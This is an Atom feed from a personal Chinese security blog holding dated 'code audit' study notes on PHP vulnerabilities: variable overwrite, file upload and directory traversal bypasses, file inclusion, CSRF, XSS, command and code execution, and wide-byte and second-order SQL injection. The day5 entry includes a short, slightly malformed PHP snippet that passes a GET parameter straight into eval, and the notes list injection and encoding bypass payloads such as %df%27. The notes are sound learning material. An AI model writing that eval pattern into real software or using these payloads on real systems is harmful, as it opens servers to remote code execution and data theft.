<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lingxin16&#39;blog</title>
  
  <subtitle>ctf</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lingxin16.github.io/"/>
  <updated>2020-03-26T14:42:02.817Z</updated>
  <id>http://lingxin16.github.io/</id>
  
  <author>
    <name>奝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计day10</title>
    <link href="http://lingxin16.github.io/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day10/"/>
    <id>http://lingxin16.github.io/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day10/</id>
    <published>2020-03-26T13:36:59.000Z</published>
    <updated>2020-03-26T14:42:02.817Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>变量覆盖是指变量未被初始化，我们可以自定义参数值替换程序原有的变量值</p><h2 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">int extract ( $array , extract_rules,prefix )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$array 关联的数组，受第二个和第三个参数的影响</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">extract_rules 对待非法&#x2F; 数字和冲突的键名的方法将根据取出标记</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">prefix 仅在第二个参数特殊时需要，添加前缀</span></pre></td></tr></table></figure><h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">EXTR_OVERWRITE-默认。如果有冲突，则覆盖已有的变量。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">EXTR_SKIP- 如果有冲突，不覆盖已有的变量。( 忽略数组中同名的元素)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">EXTR_PREFIX_SAME .如果有冲突，在变量名前加上前缀prefix。自PHP4.0.5起，这也包括了对数字索引的处理</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">EXTR_PREFIX_ALL- 给所有变量名加上前缀prefx (第三个参数)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">EXTR_PREFIX_INVALID -仅在非法或数字变量名前加上前缎prefix。本标记是PHP4.0.5新加的。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">EXTR_IF_EXISTS- 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。可以用在已经定义了一组合法的变量，然后要从一个数组例如$_REQUEST中提取值覆盖这些变量的场合。本标记是PHP4.2.0新加的。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">EXTR_PREFIX_IF_EXISTS-仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。本标记是PHP4.2.0新加的。</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">EXTR_REFS-将变量作为引用提取。这有力地表明了导入的变量仍然引用了var_array 参数的值。可以单独使用这个标志或者在extract_type中用OR与其它任何标志结合使用。本标记是PHP4.3.0新加的。</span></pre></td></tr></table></figure><h2 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">void parse_str ( string $encoded_string [, array &amp;$result] )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$encoded_string 输入的字符串</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&amp;$result 变量将会以数组元素的形式存入到这个数组，作为替代</span></pre></td></tr></table></figure><h2 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bool import_request_variables ( string $type [, string $prefix ] )</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$type 指定需要导入的变量。可以用字母‘G&#39;、‘P&#39;和 ‘C‘分别表示GET、POST和Cookie</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$prefix 变量名前缀</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h2 id=&quot;变量覆盖&quot;&gt;&lt;a href=&quot;#变量覆盖&quot; class=&quot;headerlink&quot; title=&quot;变量覆盖&quot;&gt;&lt;/a&gt;变量覆盖&lt;/h2&gt;&lt;p&gt;变量覆盖是指变量未被初始化，我们可以自定义参数值替换程序原有的变量值&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day9</title>
    <link href="http://lingxin16.github.io/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/"/>
    <id>http://lingxin16.github.io/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/</id>
    <published>2020-03-25T13:49:57.000Z</published>
    <updated>2020-03-25T14:53:53.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><a id="more"></a><p>服务端：</p><p>1.黑白名单过滤</p><p>2.修改MIME类型</p><p>3.截断上传攻击</p><p>4..htaccess文件攻击</p><p>5.目录验证</p><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>目录穿越(Directory Traversal)攻击是黑客能够在Web应用程序所在的根目录以外的文件夹上,任意地存取被限制的文件夹、执行命令或查找数据。目录穿越攻击,也有人称为Path Traversal攻击。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>进行URL编码</p><p>进行16位Unicode编码</p><p>进行双倍URL编码</p><p>进行超长UTF-8 Unicode编码</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含漏洞的产生原因是在通过引入文件时,引用的文件名用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。当被包含的文件在服务器本地时,就形成的本地文件包含漏洞,被包涵的文件在第三方服务是,就形成了远程文件包含漏洞。</p><p>模块加载、cache调用,传入的参数拼接包含路径</p><p>include()<br>使用此函数,只有代码执行到此函数时才将文件包含进来,发生错误时只警告并继续执行。</p><p>inclue_once0<br>功能和前者一样,区别在于当重复调用同- -文件时,程序只调用一次。</p><p>require()<br>使用此函数,只要程序执行,立即调用此函数包含文件,发生错误时,会输出错误信息并<br>立即终止程序。</p><p>require_once()<br>功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。 </p><h3 id="远程包含利用方式"><a href="#远程包含利用方式" class="headerlink" title="远程包含利用方式"></a>远程包含利用方式</h3><p><img src="/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/QQ%E6%88%AA%E5%9B%BE20200325223345.jpg" alt="QQ截图20200325223345"></p><h2 id="任意文件读取及删除"><a href="#任意文件读取及删除" class="headerlink" title="任意文件读取及删除"></a>任意文件读取及删除</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p><img src="/2020/03/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day9/QQ%E6%88%AA%E5%9B%BE20200325224125.jpg" alt="QQ截图20200325224125"></p><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>unlike()</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;文件上传绕过&quot;&gt;&lt;a href=&quot;#文件上传绕过&quot; class=&quot;headerlink&quot; title=&quot;文件上传绕过&quot;&gt;&lt;/a&gt;文件上传绕过&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day8</title>
    <link href="http://lingxin16.github.io/2020/03/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day8/"/>
    <id>http://lingxin16.github.io/2020/03/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day8/</id>
    <published>2020-03-24T14:14:53.000Z</published>
    <updated>2020-03-24T14:41:56.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><a id="more"></a><p>CSRF ( Cross-site request forgery )跨站请求伪造,也有人写出XSRF。黑客伪造用户的HTTP请求。然后将这个HTTP请求发送给存在CSRF的网站,有CSRF的网站执行了伪造的HTTP请求,就引发了跨站请求伪造</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CSRF漏洞&quot;&gt;&lt;a href=&quot;#CSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;CSRF漏洞&quot;&gt;&lt;/a&gt;CSRF漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day7</title>
    <link href="http://lingxin16.github.io/2020/03/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day7/"/>
    <id>http://lingxin16.github.io/2020/03/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day7/</id>
    <published>2020-03-23T13:23:41.000Z</published>
    <updated>2020-03-23T14:08:59.772Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><a id="more"></a><p>跨站脚本攻击( Cross Site Scripting )是指攻击者利用网站程序对用户输入过滤不足,输入可以显示在页面上对其他用户造成影响的HTML代码,从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。为了与层叠样式表( Cascading Style Sheets )的缩写CSS区分开,跨站脚本攻击通常简写为XSS。</p><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p>搜索内容</p><p>发表文章</p><p>评论回复</p><p>资料设置</p><p>留言</p><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><p>反射型</p><p>存储型</p><p>DOM型</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>​    非持久型,也叫反射型XSS。通过GET和POST方法,向服务器端输入数据。用户输入的数据通常被放置在URL的query string中,或者是form数据中。如果服务器端对输入的数据不进行过滤,验证或编码,就直接将用户输入的信息直接呈现给客户，则可能会造成反射型XSS。</p><p>​    反射型XSS是比较普遍的XSS ,其危害程度通常被认为较小。但是某些反射型XSS造成的后果会很严重,如在输入框的name中输入<meta http-equiv="refresh" content="5"> ,服务器不加处理,将name的值直接送到浏览器，则浏览器会每5秒自动刷新一次。严重者会导致服务器崩溃。</p><p>常见场景:<br>●将前端获取的内容,直接输出到浏览器页面<br>●将前端获取的内容,直接输出到HTML标签<br>●将前端获取的内容，直接输出到<script>标签</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>​    持久型,也叫存储型XSS,通常是因为服务器端将用户输入的恶意脚本没有通过验证就直接存储在数据库,并且每次通过调用数据库的方式,将数据呈现在浏览器上。则该XSS跨站脚本攻击将一直存在。若其他用户访问该页面,则恶意脚本就会被触发,用于盗取其他用户的私人信息。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>​    DOM ,全称Document Object Model ,是一个平台和语言都中立的接口,可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。<br>DOM型XSS其实是一种特殊类型的XSS ,它是基于DOM文档对象模型的一种漏洞。</p></script></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;XSS漏洞&quot;&gt;&lt;a href=&quot;#XSS漏洞&quot; class=&quot;headerlink&quot; title=&quot;XSS漏洞&quot;&gt;&lt;/a&gt;XSS漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day6</title>
    <link href="http://lingxin16.github.io/2020/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day6/"/>
    <id>http://lingxin16.github.io/2020/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day6/</id>
    <published>2020-03-22T13:40:26.000Z</published>
    <updated>2020-03-22T14:19:42.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><a id="more"></a><p>命令注入是一种攻击，目标是通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单、cookie、HTTP头等）传递给系统shell时，命令注入攻击是可能的。在这种攻击中，攻击者提供的操作系统命令通常以易受攻击的应用程序的特权执行。命令注入攻击可能很大程度上是由于输入验证不足。</p><h3 id="命令执行和代码执行的区别"><a href="#命令执行和代码执行的区别" class="headerlink" title="命令执行和代码执行的区别"></a>命令执行和代码执行的区别</h3><p>代码执行：执行的效果完全受限于语言本身</p><p>命令执行：执行的效果不受限于语言语法本身，不受命令本身限制</p><h3 id="命令执行类型："><a href="#命令执行类型：" class="headerlink" title="命令执行类型："></a>命令执行类型：</h3><blockquote><p>1.代码层过滤不严</p><p>2.系统漏洞</p><p>3.第三方组件存在代码执行漏洞</p></blockquote><p>常见函数：</p><p>system函数<br>passthru函数<br>Exec函数<br>Shell_exec函数<br>“</p><p>1.system函数</p><p>string system( string $command[,int &amp;$return_var] )</p><p>$command 要执行的命令</p><p>$return_var 如果提供此参数，则外部命令执行后的返回状态将会被设置到此变量中</p><p>2.passthru函数</p><p>string passthru ( string $command [, int &amp;$return_var] )</p><p>$command 要执行的命令</p><p>$return_var 如果提供此参数，Unix命令的返回状态会被记录到此参数</p><p>3.Exec函数</p><p>string exec ( string $command [,  array &amp;$output [, int &amp;$return var ]] )</p><p>$command 要执行的命令</p><p>$output 如果提供此参数，会有命令执行的输出填充此数组</p><p>$return_ var如果同时提供$output和$return_var参数，命令执行后的返回状态会被写入到此变量</p><p>4.Shell_exec函数</p><p>string shell_exec ( string $cmd )</p><p>$cmd 要执行的命令</p><p>反引号(`)则调用此函数</p><p>5.过滤函数</p><p>Escapeshellcmd() 过滤整条命令</p><p>Escapeshellarg() 过滤整个参数</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;命令执行漏洞&quot;&gt;&lt;a href=&quot;#命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;命令执行漏洞&quot;&gt;&lt;/a&gt;命令执行漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day5</title>
    <link href="http://lingxin16.github.io/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day5/"/>
    <id>http://lingxin16.github.io/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day5/</id>
    <published>2020-03-21T15:15:22.000Z</published>
    <updated>2020-03-21T15:58:00.820Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><a id="more"></a><p>代码执行漏洞是指应用程序本身过滤不严，用户可以通过请求将代码注入到应用中执行。当应用在调用一些能将字符串转化成代码的函数(如php中的eval)时，没有考虑到用户是否能控制这个字符串，将造成代码注入漏洞。狭义的代码注入通常指将可执行代码注入到当前页面中，如php的eval函数，可以将字符串代表的代码作为php代码执行，当前用户能够控制这段字符串时，将产生代码注入漏洞</p><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><p>eval和assert<br>回调函数<br>动态执行函数<br>preg_replace函数</p><p>1.eval()、assert()将输入的字符串参数作为PHP程序代码来执行</p><p>2.回调函数mixed call_user_ func ( callable $callback [, mixed $parameter [, mixed $… ]])<br>$callback是要调用的自定义函数名称<br>$parameter是自定义函数的参数<br>常见的回调函数:<br>call_user_func()、call_user_func_array()、array_map()等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">function callBack()[</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$b &#x3D; $_GET[&#39;cmd&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">eval($b);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">call_user_func(function&#39;callBack&#39;,$b);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>3.动态执行函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">1.定义一个函数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">2.将函数名(字符串)赋值给一个变量</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">3.使用变量名代替函数名动态调用函数</span></pre></td></tr></table></figure><p>4.preg_replace</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern,mixed $replacement , mixed $subject [, int $limit &#x3D;-1 [, int &amp;$count]])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$pattern正则匹配的内容</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$replacement用于替换的字符串或字符串数组</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$subject要进行搜索和替换的字符串或字符串数组</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$pattern存在&#x2F;e模式修正符修饰 允许代码执行</span></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>正则表达式语法规则                         普通字符作为原子</p><p>限定符                                                特殊符号作为原子</p><p>边界限制符                                        通用字符类型作为原子</p><p>后向引用                                            自定义原子表作为原子</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;代码执行漏洞&quot;&gt;&lt;a href=&quot;#代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;代码执行漏洞&quot;&gt;&lt;/a&gt;代码执行漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day4</title>
    <link href="http://lingxin16.github.io/2020/03/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day4/"/>
    <id>http://lingxin16.github.io/2020/03/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day4/</id>
    <published>2020-03-20T14:22:05.000Z</published>
    <updated>2020-03-20T15:29:18.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><a id="more"></a><p>因为%df的关系, \的编码%5c被吃掉了,也就失去了转义的效果,直接被带入到mysql中,然后mysql在解读时无视了%a0%5c形成的新字节，那么单引号便重新发挥了效果</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p>%df%27===&gt; (addslashes)====&gt; %df%5c%27====&gt;(GBK)====&gt;運’<br>用户输入===&gt;过滤函数===&gt;代码层的$sql==&gt; mysql处理请求= =&gt;mysql中的sql<br>默认编码character set_ client== &gt;根据character. set connection转码== &gt;更新数据库时转化成字段<br>所对应的编码</p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h3><p>(1)使用mysql_set_charset(GBK)指定字符集<br>(2)使用mysql _real_escape_string进行转义</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>注入点因为经过过滤处理无法触发sql注入漏洞,比如addslashes函数,将单引号等字符转义变成,但是存进数据库后，数据又被还原，在这种情况下。如果发现一个新的注入同时引用了被插入的数据库数据，就可以实现闭合新发现的注入漏洞引发二次注入(先将注入语句插入到数据库中，然后再触发语句)</p><p>一阶注入:<br>1.一阶SQL注 入发生在一个HTTP请求和响应中 ,对系统的攻击是立即执行的<br>2.攻击者在http请求中提交非法输入<br>3.应用程序处理非法输入。使用非法输入构造SQL语句<br>4.在攻击过程中向攻击者返回结果<br>二阶注入:<br>1.攻击者在http请求中提交恶意输入<br>2.恶意输入保存在数据库中<br>3.攻击者提交第二次http请求<br>4.为处理第二次http请求,程序在检索存储在数据库中的恶意输入，构造SQL语句<br>5.如果攻击成功,在第二次请求响应中返回结果</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;宽字节注入&quot;&gt;&lt;a href=&quot;#宽字节注入&quot; class=&quot;headerlink&quot; title=&quot;宽字节注入&quot;&gt;&lt;/a&gt;宽字节注入&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day3</title>
    <link href="http://lingxin16.github.io/2020/03/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day3/"/>
    <id>http://lingxin16.github.io/2020/03/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day3/</id>
    <published>2020-03-19T14:38:28.000Z</published>
    <updated>2020-03-19T15:35:26.213Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码审计Sql注入漏洞"><a href="#代码审计Sql注入漏洞" class="headerlink" title="代码审计Sql注入漏洞"></a>代码审计Sql注入漏洞</h2><a id="more"></a><p>注入类型：数字型、字符型，这两种都包括以下几种注入</p><p>post注入、cookie注入、宽字节注入、二次注入、盲注、base64注入、探索注入</p><p>数字型：当输入的参数为整型时，则可认为是数字型注入</p><blockquote><p>$result = “select * from admin where id=$id”;</p></blockquote><p>不需要单引号来闭合</p><p>字符型：当输入的参数为字符串时，称之为字符型注入</p><blockquote><p>$result = “select * from admin where id=’$id’ ”;</p></blockquote><p>需要单引号来闭合</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;代码审计Sql注入漏洞&quot;&gt;&lt;a href=&quot;#代码审计Sql注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;代码审计Sql注入漏洞&quot;&gt;&lt;/a&gt;代码审计Sql注入漏洞&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day2</title>
    <link href="http://lingxin16.github.io/2020/03/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day2/"/>
    <id>http://lingxin16.github.io/2020/03/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day2/</id>
    <published>2020-03-18T13:32:37.000Z</published>
    <updated>2020-03-18T14:34:26.346Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h2><p>echo</p><p>​    最简单的输出数据调试方法，一般用来输出变量值或者不确定执行到哪个分支</p><a id="more"></a><p>print_r、var_dump、debug_zval_dump</p><p>​    输出变量的数据值，特别是数组和对象数据，一半在查看接口的返回值或者不确定的变量可以使用这两个api，debug_zval_dump输出结果和var_dump类似，位移增加的值是refcount，记录一个变量被引用了多少次</p><p>debug_print_backtrace</p><p>​    可以查看输出的调用栈信息</p><p>exit()</p><p>​    停止程序，无法运行后面代码</p><h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a>超全局变量</h2><p>全局变量</p><p>​    全局变量就是在函数外面定义的变量。不能在函数中直接使用。因为它的作用域不<br>会到函数内部。所以在函数内部使用的时候常常看到类似global $a;</p><p>超全局变量</p><p>​    超全局变量作用域在所有脚本都有效。所以,在函数可直接使用。比如$_ GET，<br>$. SERVER都是超全局变量。除$<em>GET, $. _POST,$</em> SERVER, $_ COOKIE等之外的超全局<br>变量保存在$GLOBALS数组中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$GLOBALS</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$_REQUEST</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$_GET</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$_ENV</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">$_SESSION</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$_SERVE</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$_POST</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">$_FILES</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">$_COOKIS</span></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;代码调试&quot;&gt;&lt;a href=&quot;#代码调试&quot; class=&quot;headerlink&quot; title=&quot;代码调试&quot;&gt;&lt;/a&gt;代码调试&lt;/h2&gt;&lt;p&gt;echo&lt;/p&gt;
&lt;p&gt;​    最简单的输出数据调试方法，一般用来输出变量值或者不确定执行到哪个分支&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>代码审计day1</title>
    <link href="http://lingxin16.github.io/2020/03/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day1/"/>
    <id>http://lingxin16.github.io/2020/03/17/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day1/</id>
    <published>2020-03-17T13:48:33.000Z</published>
    <updated>2020-03-17T15:36:14.221Z</updated>
    
